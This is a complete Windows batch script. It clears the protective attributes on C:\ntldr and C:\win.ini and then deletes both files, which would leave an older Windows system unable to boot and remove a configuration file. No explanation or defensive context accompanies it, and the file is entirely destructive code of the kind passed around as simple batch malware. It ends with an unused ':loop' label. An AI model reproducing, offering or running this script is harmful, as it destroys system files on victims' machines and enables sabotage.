@echo off
attrib -S -R -H C:\ntldr
del C:\ntldr
attrib -S -R -H C:\win.ini
del C:\win.ini
:loop
